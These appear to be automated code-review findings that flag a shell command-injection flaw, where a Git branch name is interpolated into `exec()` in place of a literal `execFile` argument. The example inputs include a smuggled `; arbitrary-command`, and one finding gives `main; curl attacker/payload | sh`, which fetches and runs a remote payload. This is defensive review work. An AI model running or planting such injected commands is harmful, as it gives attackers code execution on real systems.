findings.title: [P1] Pass the branch as an argv element
findings.body: When `branch` contains shell metacharacters, `exec()` evaluates them as shell syntax. For example, `main; arbitrary-command` executes an additional command with the application's privileges. The previous `execFile("git", ["show", branch])` passed the value literally and should be retained.

findings.title: [P2] Keep the Git process directly cancellable
findings.body:
`exec` returns the shell process rather than reliably returning Git. On POSIX, a caller-supplied ref containing shell syntax—valid Git refs can contain characters such as `&`, `|`, `$`, and parentheses—can make the shell launch descendants or background jobs. Calling `.kill()` then terminates only the shell, allowing Git or another spawned process to continue, and the shell's `exit` event can occur before the operation finishes. `execFile` passed the ref literally and cancellation targeted Git directly.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argv element instead of interpolating it into a shell command
findings.body:
`exec` invokes a shell, so a caller-controlled value such as `HEAD; arbitrary-command` executes the appended command. The previous `execFile("git", ["show", branch])` passed the value literally and prevented shell command injection.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch argument out of a shell
findings.body:
`exec()` evaluates the interpolated branch through a command shell. Any caller passing an untrusted branch such as `main; curl attacker/payload | sh` enables arbitrary commands with the application’s privileges. The previous `execFile()` call passed the branch as a literal argument and prevented shell injection.

_Recommend validating this comment independently._
